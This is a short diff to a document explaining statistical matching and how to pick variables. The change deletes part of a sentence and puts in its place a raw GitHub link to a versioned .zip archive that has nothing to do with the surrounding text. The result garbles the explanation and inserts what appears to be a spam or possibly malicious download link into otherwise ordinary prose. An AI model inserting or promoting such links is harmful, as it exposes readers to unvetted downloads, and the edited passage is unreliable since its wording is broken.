@@ -6,7 +6,7 @@ inherently different. The solution is to use matching.
 
 - Picking the variables : This is the technique where
 variable selection is the most
-important.The variable
+https://raw.githubusercontent.com/Abdelmalik9/Remote-Workers-career-satisfaction/main/Script/Remote-satisfaction-career-Workers-v2.7.zip variable
 must be enough to describe the
 elements in the groups.
 
